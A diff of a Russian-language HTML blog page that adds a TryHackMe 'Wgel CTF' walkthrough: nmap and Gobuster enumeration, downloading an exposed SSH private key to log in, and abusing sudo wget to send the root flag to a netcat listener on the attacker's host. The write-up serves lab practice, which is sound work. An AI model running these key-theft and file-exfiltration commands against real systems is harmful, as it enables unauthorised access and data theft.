@@ -1,57 +1,157 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- Теги анти-кеша -->
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
     <title>Wgel CTF | Dr@ng3</title>
     <link rel="stylesheet" href="style.css">
     <style>
-        /* Дополнительные стили для контента */
-        .post-content { margin-top: 30px; line-height: 1.8; }
-        .post-content h1, .post-content h2, .post-content h3 { color: #fff; margin-top: 20px; }
-        .post-content p { margin-bottom: 15px; }
-        .post-content code { background: #111; padding: 2px 5px; border-radius: 3px; color: #ff00ff; }
-        .post-content pre { background: #111; padding: 15px; overflow-x: auto; border-left: 3px solid #00ffcc; margin-bottom: 20px; }
-        .post-content img { max-width: 100%; border: 1px solid #333; margin: 10px 0; }
-        .back-btn { display: inline-block; margin-bottom: 20px; color: #888; text-decoration: none; }
-        .back-btn:hover { color: #00ffcc; }
+        /* Стили для страницы статьи */
+        .post-container {
+            margin-top: 30px;
+            background: rgba(10, 10, 10, 0.9);
+            padding: 40px;
+            border: 1px solid #333;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 255, 204, 0.1);
+        }
+        
+        .post-title {
+            font-size: 2.5rem;
+            color: #fff;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+        }
+
+        .post-meta {
+            color: var(--accent-color);
+            font-size: 1rem;
+            margin-bottom: 30px;
+            border-bottom: 1px dashed #333;
+            padding-bottom: 15px;
+        }
+
+        .post-content {
+            line-height: 1.8;
+            font-size: 1.1rem;
+        }
+
+        .post-content h2 {
+            color: var(--text-color);
+            margin-top: 30px;
+            margin-bottom: 15px;
+            border-left: 4px solid var(--text-color);
+            padding-left: 10px;
+        }
+
+        .post-content h3 {
+            color: #fff;
+            margin-top: 20px;
+        }
+
+        .post-content p {
+            margin-bottom: 15px;
+        }
+
+        /* Стили для кода */
+        .post-content code {
+            background: #111;
+            padding: 2px 6px;
+            border-radius: 4px;
+            color: var(--accent-color);
+            font-family: 'Fira Code', monospace;
+        }
+
+        .post-content pre {
+            background: #050505;
+            padding: 15px;
+            overflow-x: auto;
+            border-left: 3px solid var(--text-color);
+            margin-bottom: 20px;
+            border-radius: 5px;
+        }
+
+        .post-content pre code {
+            background: transparent;
+            color: #ccc;
+            padding: 0;
+        }
+
+        .post-content img {
+            max-width: 100%;
+            border: 1px solid #333;
+            margin: 20px 0;
+            border-radius: 5px;
+        }
+
+        .back-btn {
+            display: inline-block;
+            margin-bottom: 20px;
+            color: #888;
+            text-decoration: none;
+            font-weight: bold;
+            transition: 0.3s;
+        }
+
+        .back-btn:hover {
+            color: var(--text-color);
+            text-shadow: 0 0 10px var(--text-color);
+        }
     </style>
 </head>
 <body>
     <canvas id="matrix"></canvas>
+    
     <div class="container">
         <header>
             <div class="logo">>_ Dr@ng3</div>
             <nav>
-                <a href="index.html" class="nav-link">Home</a>
+                <a href="index.html">Home</a>
             </nav>
         </header>
 
-        <main class="post-content">
-            <a href="index.html" class="back-btn">< Назад к терминалу</a>
+        <article class="post-container">
+            <a href="index.html" class="back-btn">< Назад в терминал</a>
             
-            <h1 class="glitch" data-text="Wgel CTF">Wgel CTF</h1>
-            <p style="color: #ff00ff;">TryHackMe | #web #linux #privesc</p>
+            <h1 class="post-title">Wgel CTF</h1>
+            <div class="post-meta">TryHackMe | #web #linux #privesc | Nov 05, 2026</div>
             
-            <hr style="border-color: #333; margin: 20px 0;">
+            <div class="post-content">
+                <p>Всем привет. Это разбор комнаты <strong>Wgel CTF</strong> с платформы TryHackMe. Цель — получить пользовательский и корневой флаги.</p>
 
-            <h2>1. Разведка</h2>
-            <p>Сканируем порты с помощью Nmap...</p>
-            <pre><code>nmap -sC -sV -Pn -p 22,80 10.113.135.112</code></pre>
-            <p>Находим открытые порты 22 (SSH) и 80 (HTTP).</p>
+                <h2>1. Разведка (Reconnaissance)</h2>
+                <p>Первым делом сканируем целевой хост с помощью Nmap, чтобы найти открытые порты.</p>
+<pre><code>nmap -sC -sV -Pn -p 22,80 10.113.135.112</code></pre>
+                <p>Находим два открытых порта: <code>22 (SSH)</code> и <code>80 (HTTP)</code>. На 80-м висит дефолтная страница Apache.</p>
 
-            <h2>2. Поиск директорий</h2>
-            <p>Используем Gobuster для поиска скрытых папок:</p>
-            <pre><code>gobuster dir -u http://10.113.135.112 -w /usr/share/wordlists/dirb/common.txt</code></pre>
-            <p>Находим папку <code>/sitemap/</code>, а в ней скрытую <code>/.ssh</code>.</p>
+                <h2>2. Перечисление директорий</h2>
+                <p>В исходном коде главной страницы находим комментарий с именем пользователя: <code>Jessie</code>. Далее запускаем брутфорс директорий с помощью Gobuster.</p>
+<pre><code>gobuster dir -u http://10.113.135.112 -w /usr/share/wordlists/dirb/common.txt</code></pre>
+                <p>Находим папку <code>/sitemap/</code>. Запускаем Gobuster уже по ней и находим скрытую папку <code>/.ssh</code>.</p>
 
-            <!-- ДОБАВЬ СЮДА ОСТАЛЬНОЙ ТЕКСТ WRITEUP'А -->
-            
-        </main>
+                <h2>3. Первоначальный доступ</h2>
+                <p>В папке <code>/.ssh</code> лежит приватный SSH-ключ <code>id_rsa</code>. Скачиваем его и используем для входа под пользователем jessie.</p>
+<pre><code>curl http://10.113.135.112/sitemap/.ssh/id_rsa -o id_rsa
+chmod 600 id_rsa
+ssh -i id_rsa jessie@10.113.135.112</code></pre>
+                <p>Мы внутри. Находим пользовательский флаг в файле <code>/home/jessie/Documents/user_flag.txt</code>.</p>
+
+                <h2>4. Эскалация привилегий</h2>
+                <p>Проверяем права пользователя jessie через <code>sudo -l</code>. Видим, что ему разрешено запускать <code>/usr/bin/wget</code> от имени root без пароля. Используем это для эксфильтрации рут-флага.</p>
+                <p>На нашей машине поднимаем слушатель:</p>
+<pre><code>nc -lvnp 4444</code></pre>
+                <p>На машине жертвы выполняем отправку файла:</p>
+<pre><code>sudo /usr/bin/wget --post-file=/root/root_flag.txt http://10.113.180.235:4444/</code></pre>
+                <p>Получаем корневой флаг в терминале с netcat. Комната пройдена!</p>
+            </div>
+        </article>
     </div>
+
     <script src="script.js"></script>
 </body>
 </html>
